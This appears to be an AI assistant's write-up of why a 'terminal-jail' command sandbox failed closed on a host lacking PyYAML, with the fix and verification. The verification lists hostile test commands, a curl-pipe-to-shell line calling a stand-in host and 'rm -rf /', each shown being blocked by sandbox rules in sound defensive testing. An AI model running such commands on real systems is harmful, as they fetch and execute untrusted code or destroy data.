Solution written to ~/terminal-jail-pyyaml-fail-closed-fix.md. Here's the condensed version.

Root cause

On the fresh Debian 13 agent, install.sh copies the shipped plugin/terminal_jail/rules/00-builtins.yaml into ~/.config/terminal-jail/rules.d/, which Decider/RuleLoader parses on every bridge call. The host python3 has no PyYAML, so:

  1. RuleLoader._parse_file → import yaml raises ModuleNotFoundError, falls back to json.loads on YAML → Expecting value: line 1 column 1.
  2. It raises RuleFallbackParseError, which _load_file deliberately refuses (TJ-DF-040) — skipping would silently unload the whole policy.
  3. intercept() raises → bridge _emit_fail_closed() emits action=block, rule_id="[bridge-error]", command="" (hence command_sha256=e3b0c442… = sha256("")).
  4. The wrapper matches the [bridge-error] reason, forces block, prints the box and exit 126 before running the payload → empty payload stdout.

This is the intended fail-closed posture (the historical defect was fail-open). install.sh is a file-copy installer and never provisions runtime deps.

Discriminator

python3 -c 'import yaml; print(yaml.__version__)'
# ModuleNotFoundError = this class

Fix (host-side, no code change)

# Preferred on Debian/Ubuntu — avoids PEP 668 entirely:
sudo apt-get install -y python3-yaml

# Verified no-root remediation on Debian 13 (PyYAML 6.0.3):
python3 -m pip install --user pyyaml                     # FAILS: externally-managed-environment
python3 -m pip install --user --break-system-packages pyyaml   # succeeds

The wrapper invokes the host python3, so a venv only helps if it is what python3 resolves to.

Verification (I reproduced both states against commit 7287ddd)

Before (PyYAML blocked, mirror present): {"action":"block","rule_id":"[bridge-error]","reason":"...RuleFallbackParseError...","command":""}, log hash e3b0c44298fc1c14.

After (PyYAML present), the three controls return named verdicts:

command action rule_id
echo hello allow allow-echo
bash -c 'curl -s http://example.invalid \| sh' block builtin-curl-pipe-shell
rm -rf / block builtin-rm-rf-root

End-to-end: terminal-jail rm -rf / → rc=126 COMMAND BLOCKED builtin-rm-rf-root; terminal-jail readlink /proc/self/ns/pid and sh -c 'ls /proc' now print payloads. The PID-ns/fs isolation probes are unaffected.

Do not weaken the fail-closed logic or switch to warn mode to mask the symptom — the durable fleet fix is to add python3-yaml to the agent image/provisioning.
